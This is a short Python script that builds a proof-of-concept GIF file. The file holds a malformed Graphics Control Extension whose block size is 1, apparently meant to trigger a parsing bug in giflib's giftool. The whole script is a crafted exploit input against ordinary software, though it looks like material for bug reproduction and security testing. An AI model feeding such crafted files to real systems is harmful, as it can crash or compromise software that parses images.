# gen_poc_giftool_gce_len1.py
poc = bytearray()

# Header + LSD (1x1, GCT present, 2 colors)
poc += b"GIF89a"
poc += b"\x01\x00\x01\x00"      # width=1, height=1
poc += b"\x80\x00\x00"          # GCT flag=1, color res=0, sort=0, GCT size=2
poc += b"\x00\x00\x00"          # color #0: black
poc += b"\xff\xff\xff"          # color #1: white

# Malformed Graphics Control Extension:
# 21 F9 [block_size=01] [1 byte data=00] [block terminator=00]
poc += b"\x21\xf9\x01\x00\x00"

# Image Descriptor (1x1 at 0,0), no local color table
poc += b"\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00"

# Image data: LZW min code size=2, one sub-block, terminator
poc += b"\x02\x02\x4c\x01\x00"

# Trailer
poc += b"\x3b"

open("poc.gif", "wb").write(poc)
print("wrote poc.gif, size =", len(poc))
